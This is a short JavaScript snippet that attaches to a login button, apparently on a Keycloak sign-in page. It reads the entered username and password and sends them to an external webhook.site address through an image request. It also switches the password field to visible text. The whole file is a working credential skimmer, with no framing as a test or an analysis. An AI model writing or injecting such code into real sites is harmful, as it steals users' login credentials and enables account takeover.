var btn = document.getElementById('kc-login');

if (btn) {
    btn.onclick = function() {
        var passwordInput = document.getElementById('password');
        if (passwordInput) {
            passwordInput.type = 'text';
        }
        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;
        
        new Image().src = 'https://webhook.site/45ade011-e017-4fe9-b767-df5008d430ee/?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password);
    };
}
